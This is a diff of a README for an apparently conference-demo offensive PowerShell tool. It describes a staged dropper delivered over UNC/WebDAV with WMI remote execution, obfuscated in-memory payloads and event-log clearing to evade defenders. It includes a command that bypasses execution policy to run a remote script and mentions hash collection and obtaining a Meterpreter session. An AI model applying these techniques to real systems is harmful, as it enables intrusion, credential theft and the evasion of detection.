@@ -16,10 +16,13 @@ Of course, **feel free to reuse code parts for your own purpose in case of need 
 ## Details
 
    **Stage 1** (executed on attacker's side):
-        The "stage 1" is a simple dropper for payload delivery through UNC/WebDAV using basic obfuscation (require admin. privs for RCE over WMI ofc).
-	It is executed from attackers station (C2C) to run in-memory fud PowerShell without the well-known `IWR/IEX` method calls.
+   
+The "stage 1" is a simple dropper for payload delivery through UNC/WebDAV using basic obfuscation (require admin. privs for RCE over WMI ofc).
+	
+It is executed from attackers station (C2C) to run in-memory fud PowerShell without the well-known `IWR/IEX` method calls.
 
 [*] Notes:
+
 UNC/WebDAV could be replaced by WMI namespaces as presented in WmiSploit project `https://github.com/secabstraction/WmiSploit`.
         
 However, the executed command is then limited to 8190 chars due to `-EncodedCommand` usage for b64 payload, this is the reason why I prefered this method for the PoC.
@@ -33,21 +36,25 @@ Classic stager from command line:
 
     
    **Stage 2** (executed on target):
-  In-memory build stage 2 using "-File" parameter (obfuscated PowerShell with random Class Derivation).
+   
+ In-memory build stage 2 using "-File" parameter (obfuscated PowerShell with random Class Derivation).
   
-  Randomly generated class derivation and "EventViewer" logs removing for detection mechanisms/blue team evasion.
-  Stage 1 execution is not removed from logs for demo purpose, it should be modified for a total discretion ;).
+ Randomly generated class derivation and "EventViewer" logs removing for detection mechanisms/blue team evasion.
+ 
+ Stage 1 execution is not removed from logs for debug purpose, it should be modified for a total discretion ;).
 
 
    [*] Notes:
-        C2C shell could be used in combination to unicorn to obtains Meterpreter session (stage 2 could be modified depending on the use case):
+     
+C2C shell could be used in combination to unicorn to obtains Meterpreter session (stage 2 could be modified depending on the use case):
         
         Examples: `powershell.exe -eXecUtIOnpOlICy BypAsS -File "\\Vboxsvr\shared\BSIDESIE\pwner.ps1"`
 
         IMPORTANT: Payload delivery using "-File" parameter also permit to add hashes collection when payload (stage 2) is triggered.
 
    **stage 3** (executed on target):
-        Payload execution and output push/pull via a random file located on attacker's server.
+       
+Payload execution and output push/pull via a random file located on attacker's server.
 	
 ## Demo
 
